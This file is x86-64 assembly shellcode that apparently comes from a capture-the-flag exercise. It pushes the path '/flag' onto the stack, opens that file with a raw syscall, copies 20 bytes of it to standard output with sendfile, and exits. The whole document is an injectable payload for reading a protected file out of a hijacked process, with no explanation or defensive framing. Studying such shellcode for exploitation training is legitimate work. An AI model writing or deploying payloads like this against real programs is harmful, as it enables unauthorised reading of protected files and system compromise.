.global _start
.intel_syntax noprefix

_start:
	#mov rax, 2
	#xor rax, rax
	mov al , 2
	mov edi, 0x67616c66
	shl rdi, 8
	mov dil, 0x2f
	push rdi
	lea rdi, [rsp]
	xor rsi, rsi
	syscall

	mov rsi, rax
	xor rdi, rdi
	inc rdi
	xor rdx, rdx
	mov r10b, 20
	mov al, 40
	syscall

	mov al, 60
	syscall
